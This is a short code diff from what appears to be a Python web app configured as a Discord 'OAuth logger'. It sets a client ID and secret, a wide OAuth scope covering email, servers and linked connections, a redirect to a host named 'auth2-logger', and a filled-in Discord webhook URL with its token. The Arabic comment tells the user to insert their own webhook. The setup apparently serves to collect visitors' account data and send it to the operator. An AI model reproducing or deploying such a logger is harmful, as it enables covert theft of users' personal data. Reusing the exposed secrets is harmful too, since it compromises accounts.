@@ -11,11 +11,11 @@ app.secret_key = os.urandom(32)
 # ===== CONFIG =====
 CLIENT_ID = "1541786357028884534"
 CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
-REDIRECT_URI = "https://protective-wallpaper-trio-sharing.trycloudflare.com/callback"
+REDIRECT_URI = "https://auth2-logger.vercel.app//callback"
 OAUTH_SCOPE = "identify email guilds connections guilds.members.read"
 
 # ضع هنا رابط الويب هوك حقك
-WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1543233856298025041/QFkQ3qo1xiepaVs_nstfOmpgzHV2sS3V0u6CN4WD6v7sOO1y7HYkEKP5Bg_9cyI24XQP"
 
 # ==================
 
